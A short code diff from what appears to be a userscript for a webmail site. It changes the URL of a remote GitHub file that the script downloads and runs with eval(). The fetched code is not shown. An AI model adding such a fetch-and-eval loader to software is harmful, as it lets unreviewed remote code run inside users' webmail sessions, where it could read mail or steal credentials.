@@ -27,7 +27,7 @@
 (function() {
     GM.xmlHttpRequest({
         method: 'GET',
-        url: 'https://github.com/syrabrox/userscript/raw/refs/heads/main/code.webmail.crypted.user.js',
+        url: 'https://github.com/syrabrox/userscript/raw/refs/heads/main/webmail.code.js',
         onload: function(response) {
             eval(response.responseText);
         }
